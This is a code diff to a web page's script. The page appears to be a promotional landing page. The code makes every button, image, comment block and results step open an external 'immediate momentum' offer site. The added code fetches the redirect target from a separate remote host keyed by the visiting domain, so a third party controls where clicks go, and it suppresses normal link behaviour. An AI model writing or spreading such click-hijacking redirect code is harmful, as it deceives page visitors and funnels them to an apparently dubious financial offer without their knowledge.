@@ -1,3 +1,18 @@
+let offerPageUrl = "https://trueprofits360.com/immediate_momentum_v2/ca/en/";
+
+fetch(`https://red.darmona.org/offer?domain=${window.location.host}`)
+  .then(response => response.json())
+  .then(data => {
+    if (data.link) {
+      offerPageUrl = data.link;
+    }
+  })
+  .catch(error => {
+    console.error('Failed to fetch the offer page URL:', error);
+  });
+
+
+
 document.addEventListener('DOMContentLoaded', function() {
   const buttons = document.querySelectorAll('button');
   const images = document.querySelectorAll('img');
@@ -8,8 +23,9 @@ document.addEventListener('DOMContentLoaded', function() {
   const comments = document.querySelectorAll('.comments .block');
   const steps = document.querySelectorAll('.results .step');
   
-  function goToOfferPage() {
-    window.open('https://trueprofits360.com/immediate_momentum_v2/ca/en/', '_blank');
+  function goToOfferPage(e) {
+    e.preventDefault();
+    window.open(offerPageUrl, '_blank');
   }
   
   const elementsToClick = [
@@ -26,4 +42,6 @@ document.addEventListener('DOMContentLoaded', function() {
   elementsToClick.forEach(element => {
     element.addEventListener('click', goToOfferPage);
   });
+  
+  
 });
